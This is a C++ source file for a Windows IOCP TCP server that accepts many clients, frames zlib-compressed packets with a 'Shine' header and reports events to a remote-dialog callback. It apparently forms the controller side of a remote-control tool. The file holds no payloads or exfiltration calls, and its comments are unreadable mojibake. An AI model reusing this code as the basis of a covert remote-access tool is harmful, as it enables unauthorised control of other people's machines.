#include "stdafx.h"
#include "IOCPServer.h"
#include "CpuUseage.h"
#include "Common.h"
#include "zlib.h"



CRITICAL_SECTION CIOCPServer::m_cs = {0};
const char chOpt = 1;    //��������˼
CIOCPServer::CIOCPServer()
{
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2,2), &wsaData)!=0)
	{
		return;
	}
    //��ʼ���׽���
	m_sockListen    = NULL;
	m_hEvent		= NULL;
	m_hThread       = NULL;
	m_bInit         = false;
	m_hCompletionPort = NULL;

	m_hKillEvent	= CreateEvent(NULL, TRUE, FALSE, NULL);

	m_pNotifyProc  = NULL;

	m_nWorkerCnt    = 0;
	m_nCurrentThreads	= 0;
	m_nBusyThreads		= 0;
	m_bTimeToKill		= false;


	m_nKeepLiveTime = 1000 * 60 * 3; // ����������û�����ݾͷ������ݰ�̽��һ��

	m_nSendKbps = 0;
	m_nRecvKbps = 0;


	BYTE bPacketFlag[] = {'S', 'h', 'i', 'n', 'e'};           //���������ݷ��͵ı��  ���ض�ͬ���ض��ַ�����һ��
	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag)); 
	m_nMaxConnections = 10000;                                //������������

	InitializeCriticalSection(&m_cs);
}


CIOCPServer::~CIOCPServer()
{
	Shutdown();
	WSACleanup();
}


void CIOCPServer::Shutdown()
{
	closesocket(m_sockListen);	
	WSACloseEvent(m_hEvent);

	DeleteCriticalSection(&m_cs);
}


bool CIOCPServer::Initialize(NOTIFYPROC pNotifyProc, CMainFrame* pFrame, int nMaxConnections, int nPort)
{
	m_pNotifyProc	= pNotifyProc;														 //�������ϵĻص�����
	
	m_pFrame		=  pFrame;
	//���������׽���
	m_sockListen = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED);     //���������׽���

	//��ʼ�� �׽���
	if (m_sockListen == INVALID_SOCKET)
	{
		return false;
	}

	 //����������׻�����������¼� 
	m_hEvent = WSACreateEvent();                          


	if (m_hEvent == WSA_INVALID_EVENT)
	{
		closesocket(m_sockListen);
		return false;
	}


	int nRet = WSAEventSelect(m_sockListen,											  //�������׽������¼����й���������FD_ACCEPT������
		m_hEvent,
		FD_ACCEPT);

	if (nRet == SOCKET_ERROR)
	{
		closesocket(m_sockListen);
		return false;
	}

	SOCKADDR_IN		ServerAddr;		
	ServerAddr.sin_port   = htons(nPort);
	ServerAddr.sin_family = AF_INET;
	ServerAddr.sin_addr.s_addr = INADDR_ANY;                                           //��ʼ����������


	//�������׻��ֺ���������bind
	nRet = bind(m_sockListen, 
		(LPSOCKADDR)&ServerAddr, 
		sizeof(struct sockaddr));

	if (nRet == SOCKET_ERROR)
	{
		closesocket(m_sockListen);
		return false;
	}


	//�������
	nRet = listen(m_sockListen, SOMAXCONN);
	
	if (nRet == SOCKET_ERROR)
	{
		closesocket(m_sockListen);
		return false;
	}


	UINT dwThreadId = 0;

	m_hThread =
		(HANDLE)_beginthreadex(NULL,			
		0,					
		ListenThreadProc, 
		(void*)this,	     //��Thread�ص���������this �������ǵ��̻߳ص��������еĳ�Ա    
		0,					
		&dwThreadId);	

	if (m_hThread != INVALID_HANDLE_VALUE)
	{
		InitializeIOCP();    //������Ҫ�Ǵ�����ɶ˿ڲ����������߳������� �����źŵĹ�������
		
		m_bInit = true;
		
		return true;
	}

	return false;


}



unsigned CIOCPServer::ListenThreadProc(LPVOID lParam)   //�����߳�
{
	CIOCPServer* pThis = (CIOCPServer*)(lParam);


	WSANETWORKEVENTS events;

	while(1)
	{
		//�����������Լ��ĳ���Ҫ�˳������Ի���  ����̷߳��� �˳��̵߳��¼�
		if (WaitForSingleObject(pThis->m_hKillEvent, 100) == WAIT_OBJECT_0)
		{
			break;     
		}

		DWORD dwRet;
		//�ȴ����׽�����������¼�
		dwRet = WSAWaitForMultipleEvents(1,
			&pThis->m_hEvent,
			FALSE,
			1000,
			FALSE);    //�ȴ�����������׻�����������¼�1�� ����������óɹ������¼�û����Ӧ��Timeout

		if (dwRet == WSA_WAIT_TIMEOUT)
		{
			continue;
		}

		int nRet = WSAEnumNetworkEvents(pThis->m_sockListen,    //����¼����� ���Ǿͽ����¼�ת����һ�������¼� ���� �ж�
			pThis->m_hEvent,
			&events);

		if (nRet == SOCKET_ERROR)
		{
			break;
		}

		if (events.lNetworkEvents & FD_ACCEPT)
		{
			if (events.iErrorCode[FD_ACCEPT_BIT] == 0)
			{
				pThis->OnAccept();                    //�����һ�������������Ǿͽ���OnAccept()�������д���
			}
			else
			{
				break;
			}

		}

	} 
	return 0; 
}


unsigned CIOCPServer::ThreadPoolFunc (LPVOID thisContext)    
{

	ULONG ulFlags = MSG_PARTIAL;
	CIOCPServer* pThis = (CIOCPServer*)(thisContext);
	

	HANDLE hCompletionPort = pThis->m_hCompletionPort;

	DWORD dwIoSize;
	LPOVERLAPPED lpOverlapped;
	ClientContext* lpClientContext;
	OVERLAPPEDPLUS*	pOverlapPlus;
	bool			bError;
	bool			bEnterRead;

	InterlockedIncrement(&pThis->m_nCurrentThreads);  //4
	InterlockedIncrement(&pThis->m_nBusyThreads);     //4


	for (BOOL bStayInPool = TRUE; bStayInPool && pThis->m_bTimeToKill == false;) 
	{
		pOverlapPlus	= NULL;
		lpClientContext = NULL;
		bError			= false;
		bEnterRead		= false;

		InterlockedDecrement(&pThis->m_nBusyThreads);//3


		BOOL bIORet = GetQueuedCompletionStatus(
			hCompletionPort,
			&dwIoSize,  //26
			(LPDWORD) &lpClientContext,
			&lpOverlapped,INFINITE);           //�鿴��ɶ˿��е�״̬

		DWORD dwIOError = GetLastError();
		pOverlapPlus = CONTAINING_RECORD(lpOverlapped, OVERLAPPEDPLUS, m_ol);


		int nBusyThreads = InterlockedIncrement(&pThis->m_nBusyThreads);   

		if (!bIORet && dwIOError != WAIT_TIMEOUT )   //���Է����׻��Ʒ����˹ر�
		{
			if (lpClientContext && pThis->m_bTimeToKill == false)
			{
				pThis->RemoveStaleClient(lpClientContext, FALSE);
			}
			continue;
		}

		if (!bError) 
		{

			//����һ���µ��̵߳��̵߳��̳߳�
			if (nBusyThreads == pThis->m_nCurrentThreads)
			{
				if (nBusyThreads < pThis->m_nThreadPoolMax)
				{
					if (pThis->m_cpu.GetUsage() > pThis->m_nCPUHighThreadshold)
					{
						UINT nThreadID = -1;

						HANDLE hThread = (HANDLE)_beginthreadex(NULL,				
																0,				
																ThreadPoolFunc,  
																(void*) pThis,	    
																0,					
																&nThreadID);	

						CloseHandle(hThread);
					}
				}
			}

			if (!bIORet && dwIOError == WAIT_TIMEOUT)
			{
				if (lpClientContext == NULL)
				{
					if (pThis->m_cpu.GetUsage() < pThis->m_nCPULowThreadshold)
					{

						if (pThis->m_nCurrentThreads > pThis->m_nThreadPoolMin)
							bStayInPool =  FALSE;
					}

					bError = true;
				}
			}
		}


		if (!bError)
		{
			if(bIORet && NULL != pOverlapPlus && NULL != lpClientContext) 
			{
				try
				{                            //IoWrite                Context        26
					pThis->ProcessIOMessage(pOverlapPlus->m_ioType, lpClientContext, dwIoSize);     //�򴰿ڴ������ǵĴ��������
				}
				catch (...) {}
			}
		}

		if(pOverlapPlus)
		{
			delete pOverlapPlus; 
		}
	}

	InterlockedDecrement(&pThis->m_nWorkerCnt);

	InterlockedDecrement(&pThis->m_nCurrentThreads);
	InterlockedDecrement(&pThis->m_nBusyThreads);
	return 0;
} 


bool CIOCPServer::InitializeIOCP(void)
{

	SOCKET s;
	DWORD i;
	UINT  nThreadID;
	SYSTEM_INFO systemInfo;

	s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	if ( s == INVALID_SOCKET ) 
	{
		return false;
	}

	//������ɶ˿ڣ��׽���s ֻ������ռλ
	m_hCompletionPort = CreateIoCompletionPort((HANDLE)s, NULL, 0, 0 );  //����һ����ɶ˿� �������ǾͿ��Խ��������׽���Ͷ�ݸ�����ɶ˿�Ȼ����ϵͳ���̳߳ؽ��д���
	if ( m_hCompletionPort == NULL ) 
	{
		closesocket( s );
		return false;
	}
	closesocket( s );

	GetSystemInfo(&systemInfo);  //���PC���м���

	m_nThreadPoolMin  = systemInfo.dwNumberOfProcessors * HUERISTIC_VALUE;
	m_nThreadPoolMax  = m_nThreadPoolMin;
	m_nCPULowThreadshold = 10; 
	m_nCPUHighThreadshold = 75; 

	m_cpu.Init();   //Ҫ��õ�ǰ����ռ��CPU��Ч�ʵĳ�ʼ������


	UINT nWorkerCnt = systemInfo.dwNumberOfProcessors * HUERISTIC_VALUE;

	HANDLE hWorker;
	m_nWorkerCnt = 0;

	for ( i = 0; i < nWorkerCnt; i++ )    
	{
		hWorker = (HANDLE)_beginthreadex(NULL,	             //���������߳�Ŀ���Ǵ���Ͷ�ݵ���ɶ˿��е�����			
			0,						
			ThreadPoolFunc,     		
			(void*) this,			
			0,						
			&nThreadID);			
		if (hWorker == NULL ) 
		{
			CloseHandle( m_hCompletionPort );
			return false;
		}

		m_nWorkerCnt++;

		CloseHandle(hWorker);
	}

	return true;
} 




void CIOCPServer::OnAccept()
{

	SOCKADDR_IN	SockAddr;
	SOCKET		clientSocket;

	int			nRet;
	int			nLen;

//	if (m_bTimeToKill || m_bDisconnectAll)
//		return;


	nLen = sizeof(SOCKADDR_IN);
	clientSocket = accept(m_sockListen,
		(LPSOCKADDR)&SockAddr,
		&nLen);                     //ͨ�����ǵļ����׽���������һ����֮�ź�ͨ�ŵ��׽���

	if (clientSocket == SOCKET_ERROR)
	{
		nRet = WSAGetLastError();
		if (nRet != WSAEWOULDBLOCK)
		{
			return;
		}
	}

	//����������Ϊÿһ��������ź�ά����һ����֮���������ݽṹ������Ϊ�û������±�����
	ClientContext* pContext = AllocateContext();

	if (pContext == NULL)
	{
		return;
	}

	pContext->m_Socket = clientSocket;

	// Fix up In Buffer
	pContext->m_wsaInBuffer.buf = (char*)pContext->m_byInBuffer;
	pContext->m_wsaInBuffer.len = sizeof(pContext->m_byInBuffer);


	//�������Ǹոյõ�ͨ���׽����뵽��ɶ˿������������ͻ���֮ͨ�� �������ǵ���ɶ˿��еĹ����߳������
	if (!AssociateSocketWithCompletionPort(clientSocket, m_hCompletionPort, (DWORD)pContext))
	{
		delete pContext;
		pContext = NULL;

		closesocket( clientSocket );
		closesocket( m_sockListen );
		return;
	}

	//�����׽��ֵ�ѡ� Set KeepAlive �����������  SO_KEEPALIVE �������Ӽ��Է������Ƿ����
	//���2Сʱ���ڴ��׽ӿڵ���һ����û�����ݽ�����TCP���� �����Է� ��һ�����ִ��
	if (setsockopt(pContext->m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char*)&chOpt, sizeof(chOpt)) != 0)
	{
	}

	//���ó�ʱ��ϸ��Ϣ
	tcp_keepalive	klive;
	klive.onoff = 1; // ���ñ���
	klive.keepalivetime = m_nKeepLiveTime;       //����3����û�����ݣ��ͷ���̽���
	klive.keepaliveinterval = 1000 * 10; //���Լ��Ϊ10�� Resend if No-Reply
	WSAIoctl
		(
		pContext->m_Socket, 
		SIO_KEEPALIVE_VALS,
		&klive,
		sizeof(tcp_keepalive),
		NULL,
		0,
		(unsigned long *)&chOpt,
		0,
		NULL
		);
	//����������ʱ����������ͻ������߻�ϵ�ȷ������Ͽ�������
	//���������û������SO_KEEPALIVEѡ����һֱ���ر�SOCKET��
	//��Ϊ�ϵĵ�������Ĭ������Сʱʱ��̫�����������Ǿ��������ֵ

	CLock cs(m_cs, "OnAccept" );
	m_listContexts.AddTail(pContext);     //���뵽���ǵ��ڴ��б���


	OVERLAPPEDPLUS	*pOverlap = new OVERLAPPEDPLUS(IOInitialize);   //ע��������ص�IO������ �û���������

	BOOL bSuccess = PostQueuedCompletionStatus(m_hCompletionPort, 0, (DWORD)pContext, &pOverlap->m_ol);    //Ol->Event  ol   -->ol  IOInitialize
	//��Ϊ���ǽ��ܵ���һ���û����ߵ�������ô���Ǿͽ��������͸����ǵ���ɶ˿� �����ǵĹ����̴߳�����

	if ( (!bSuccess && GetLastError() != ERROR_IO_PENDING))  //���Ͷ��ʧ��
	{            
		RemoveStaleClient(pContext,TRUE);
		return;
	}

	 //�ص���������  �鿴Initialize  ��ʹ�� Ҳ�����û����������󵽴�
	//����Ҳ�����൱�ڵ��� CRemoteDlg::NotifyProc ����
	m_pNotifyProc((LPVOID)m_pFrame, pContext, NC_CLIENT_CONNECT);     

	PostRecv(pContext);                                                //��������û�Ͷ�ݽ������ݵ��첽����



	/*
	Windows��IOCPģ�ͱ���û���ṩ���ڳ�ʱ��֧��,����һ�ж�Ҫ�г���Ա�����.���ҳ�ʱ���ƶ��ڷ�����������˵�Ǳ����: 
	�����������һ���µĿͻ���������Ҫ����ɶ˿���Ͷ��һ�� WSARecv() ����,�Խ��տͻ��˵�����,�������ͻ�������һֱ����������(��ν�Ķ�������)
	��ôͶ�ݵ����������Զ�������ɶ˿ڶ����з���,ռ���˷�������Դ.����д����Ķ�������,����ܿ�ͻ᲻���ظ�.���Է������������ΪͶ�ݸ���ɶ˿ڵ���������һ����ʱʱ��.

	*/
}




void CIOCPServer::PostRecv(ClientContext* pContext)
{
	OVERLAPPEDPLUS * pOverlap = new OVERLAPPEDPLUS(IORead);    //�����ǵĸ����ߵ��û���Ͷ��һ���������ݵ�����  ����û��ĵ�һ�����ݰ�����Ҳ�;��Ǳ��ض˵ĵ�½���󵽴����ǵĹ����߳̾�
	ULONG			ulFlags = MSG_PARTIAL;					   //����Ӧ	������ProcessIOMessage����
	DWORD			dwNumberOfBytesRecvd;
	UINT nRetVal = WSARecv(pContext->m_Socket, 
		&pContext->m_wsaInBuffer,
		1,
		&dwNumberOfBytesRecvd, 
		&ulFlags,
		&pOverlap->m_ol, 
		NULL);

	if ( nRetVal == SOCKET_ERROR && WSAGetLastError() != WSA_IO_PENDING) 
	{
		RemoveStaleClient(pContext, FALSE);
	}
}



BOOL CIOCPServer::AssociateSocketWithCompletionPort(SOCKET socket, HANDLE hCompletionPort, DWORD dwCompletionKey)
{
	HANDLE h = CreateIoCompletionPort((HANDLE)socket, hCompletionPort, dwCompletionKey, 0);
	return h == hCompletionPort;
}







///////////////////////////////////////////////////////////////////////////////////////////////////////////�û������±����Ľṹ���뺯��
ClientContext*  CIOCPServer::AllocateContext()
{
	ClientContext* pContext = NULL;

	CLock cs(CIOCPServer::m_cs, "AllocateContext");       //�����m_cs���Ǹ�static   

	if (!m_listFreePool.IsEmpty())                        //�ж����ǵ��ڴ���������ڴ� �д��ڴ����ȡ��
	{
		pContext = m_listFreePool.RemoveHead();
	}
	else
	{
		pContext = new ClientContext;                    //û����̬����
	}

	if (pContext != NULL)
	{

		ZeroMemory(pContext, sizeof(ClientContext));
		pContext->m_bIsMainSocket = false;
		memset(pContext->m_Dialog, 0, sizeof(pContext->m_Dialog));
	}
	return pContext;
}

void CIOCPServer::MoveToFreePool(ClientContext *pContext)
{
	CLock cs(m_cs, "MoveToFreePool");

	POSITION pos = m_listContexts.Find(pContext);
	if (pos) 
	{
		pContext->m_CompressionBuffer.ClearBuffer();
		pContext->m_WriteBuffer.ClearBuffer();
		pContext->m_DeCompressionBuffer.ClearBuffer();
		pContext->m_ResendWriteBuffer.ClearBuffer();
		m_listFreePool.AddTail(pContext);                            //�������ڴ��
		m_listContexts.RemoveAt(pos);                                //���ڴ�ṹ���Ƴ�
	}
}

void CIOCPServer::RemoveStaleClient(ClientContext* pContext, BOOL bGraceful)
{
	CLock cs(m_cs, "RemoveStaleClient");


/*	LINGER lingerStruct;


	if ( !bGraceful ) 
	{

		lingerStruct.l_onoff = 1;
		lingerStruct.l_linger = 0;
		setsockopt( pContext->m_Socket, SOL_SOCKET, SO_LINGER,
			(char *)&lingerStruct, sizeof(lingerStruct) );
	}*/




	if (m_listContexts.Find(pContext))    //���ڴ��в��Ҹ��û������±��������ݽṹ
	{

		CancelIo((HANDLE) pContext->m_Socket);  //ȡ���ڵ�ǰ�׽��ֵ��첽IO   -->PostRecv    

		closesocket( pContext->m_Socket );      //�ر��׽���
		pContext->m_Socket = INVALID_SOCKET;

		while (!HasOverlappedIoCompleted((LPOVERLAPPED)pContext))   //�жϻ���û���첽IO�����ڵ�ǰ�׽�����
			Sleep(0);

		m_pNotifyProc((LPVOID)m_pFrame, pContext, NC_CLIENT_DISCONNECT);   //������Ͷ���û����� ��Ϣ

		MoveToFreePool(pContext);  //�����ڴ�ṹ�������ڴ��
	}
}


bool CIOCPServer::OnClientInitializing(ClientContext* pContext, DWORD dwIoSize)
{
	
	return true;		
}



bool CIOCPServer::OnClientReading(ClientContext* pContext, DWORD dwIoSize)
{
	CLock cs(CIOCPServer::m_cs, "OnClientReading");
	try
	{

		static DWORD nLastTick = GetTickCount();
		static DWORD nBytes = 0;
		nBytes += dwIoSize;

		if (GetTickCount() - nLastTick >= 1000)
		{
			nLastTick = GetTickCount();
			InterlockedExchange((LPLONG)&(m_nRecvKbps), nBytes);     //ͳ�Ƹ������յ������ݰ��Ĵ�С
			nBytes = 0;
		}

	

		if (dwIoSize == 0)    //�Է��ر����׽���
		{
			RemoveStaleClient(pContext, FALSE);
			return false;
		}

		if (dwIoSize == FLAG_SIZE && memcmp(pContext->m_byInBuffer, m_bPacketFlag, FLAG_SIZE) == 0)    //���ֻ���յ�Shine�ؼ��� �Ǳ��ض��������ض����·�������
		{
			// ���·���
			//Send(pContext, pContext->m_ResendWriteBuffer.GetBuffer(), pContext->m_ResendWriteBuffer.GetBufferLen());  //���·��ͱ�������
			// ������Ͷ��һ����������
			PostRecv(pContext);
			return true;
		}
		pContext->m_CompressionBuffer.Write(pContext->m_byInBuffer,dwIoSize);    //�����յ������ݿ����������Լ����ڴ���

		m_pNotifyProc((LPVOID)m_pFrame, pContext, NC_RECEIVE);                  //֪ͨ����


		while (pContext->m_CompressionBuffer.GetBufferLen() > HDR_SIZE)          //�鿴���ݰ��������
		{
			BYTE bPacketFlag[FLAG_SIZE];
			CopyMemory(bPacketFlag, pContext->m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));

			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)   //Shine
				throw "Bad Buffer";

			int nSize = 0;
			CopyMemory(&nSize, pContext->m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));

			// Update Process Variable
			//pContext->m_nTransferProgress = pContext->m_CompressionBuffer.GetBufferLen() * 100 / nSize;

			if (nSize && (pContext->m_CompressionBuffer.GetBufferLen()) >= nSize)
			{
				int nUnCompressLength = 0;
			
				pContext->m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));    //��ȡ����ͷ��

				pContext->m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
				pContext->m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));

		
				int	nCompressLength = nSize - HDR_SIZE;
				PBYTE pData = new BYTE[nCompressLength];
				PBYTE pDeCompressionData = new BYTE[nUnCompressLength];

				if (pData == NULL || pDeCompressionData == NULL)
					throw "Bad Allocate";

				pContext->m_CompressionBuffer.Read(pData, nCompressLength);

	
				unsigned long	destLen = nUnCompressLength;
				int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);     //��ѹ����
	
				if (nRet == Z_OK)
				{
					pContext->m_DeCompressionBuffer.ClearBuffer();
					pContext->m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
					m_pNotifyProc((LPVOID) m_pFrame, pContext, NC_RECEIVE_COMPLETE);
				}
				else
				{
					throw "Bad Buffer";
				}

				delete [] pData;
				delete [] pDeCompressionData;
				pContext->m_nMsgIn++;                          //�Ѿ����ܵ���һ�����������ݰ�
			}
			else
				break;
		}
		PostRecv(pContext);   //Ͷ���µĽ������ݵ�����
	}catch(...)
	{
		pContext->m_CompressionBuffer.ClearBuffer();
		// Ҫ���ط����ͷ���0, �ں��Զ����������־
	//	Send(pContext, NULL, 0);
		PostRecv(pContext);
	}

	return true;
}


void CIOCPServer::Send(ClientContext* pContext, LPBYTE lpData, UINT nSize)   //1    1
{
	if (pContext == NULL)
	{
		return;
	}

	try
	{
		if (nSize > 0)
		{
			//ѹ������
			unsigned long	destLen = (double)nSize * 1.001  + 12;
			LPBYTE			pDest = new BYTE[destLen];
			int	nRet = compress(pDest, &destLen, lpData, nSize);

			if (nRet != Z_OK)
			{
				delete [] pDest;
				return;
			}

			//////////////////////////////////////////////////////////////////////////
			LONG nBufLen = destLen + HDR_SIZE;
			
			pContext->m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));  //Shine
		
			pContext->m_WriteBuffer.Write((PBYTE) &nBufLen, sizeof(nBufLen));     //26    
		
			pContext->m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));        //1
			
			pContext->m_WriteBuffer.Write(pDest, destLen);                           //���ݰ�ͷ�Ĺ���
			delete [] pDest;

	
			LPBYTE lpResendWriteBuffer = new BYTE[nSize];
			CopyMemory(lpResendWriteBuffer, lpData, nSize);
			pContext->m_ResendWriteBuffer.ClearBuffer();
			pContext->m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	     // ���ݷ��͵�����
			delete [] lpResendWriteBuffer;
		}
		else // Ҫ���ط�
		{
			pContext->m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
			pContext->m_ResendWriteBuffer.ClearBuffer();
			pContext->m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// ���ݷ��͵�����	
		}

	
		//����ɶ˿�Ͷ�ݷ������ݵ����� ��Ϊ���ܴ������ǵĻص�����OnClientWriting ����������0

		OVERLAPPEDPLUS * pOverlap = new OVERLAPPEDPLUS(IOWrite);
		PostQueuedCompletionStatus(m_hCompletionPort, 0, (DWORD) pContext, &pOverlap->m_ol);     //GetQueue

		pContext->m_nMsgOut++;
	}catch(...){}
}



bool CIOCPServer::OnClientWriting(ClientContext* pContext, DWORD dwIoSize)   //dwIoSize ������˶�������
{
	try
	{

		static DWORD nLastTick = GetTickCount();
		static DWORD nBytes = 0;

		nBytes += dwIoSize;

		if (GetTickCount() - nLastTick >= 1000)
		{
			nLastTick = GetTickCount();
			InterlockedExchange((LPLONG)&(m_nSendKbps), nBytes);
			nBytes = 0;
		}
	
		ULONG ulFlags = MSG_PARTIAL;

	
		pContext->m_WriteBuffer.Delete(dwIoSize);             //����ɵ����ݴ����ݽṹ��ȥ��
		if (pContext->m_WriteBuffer.GetBufferLen() == 0)
		{
			pContext->m_WriteBuffer.ClearBuffer();
			return true;		                             //�ߵ�����˵�����ǵ�����������ȫ����
		}
		else
		{
			OVERLAPPEDPLUS * pOverlap = new OVERLAPPEDPLUS(IOWrite);           //����û�����  ���Ǽ���Ͷ�� ��������

			m_pNotifyProc((LPVOID) m_pFrame, pContext, NC_TRANSMIT);


			pContext->m_wsaOutBuffer.buf = (char*) pContext->m_WriteBuffer.GetBuffer();
			pContext->m_wsaOutBuffer.len = pContext->m_WriteBuffer.GetBufferLen();                 //���ʣ������ݺͳ���    

			int nRetVal = WSASend(pContext->m_Socket, 
				&pContext->m_wsaOutBuffer,
				1,
				&pContext->m_wsaOutBuffer.len, 
				ulFlags,
				&pOverlap->m_ol, 
				NULL);


			if ( nRetVal == SOCKET_ERROR && WSAGetLastError() != WSA_IO_PENDING )
			{
				RemoveStaleClient( pContext, FALSE );
			}

		}
	}catch(...){}
	return false;			
}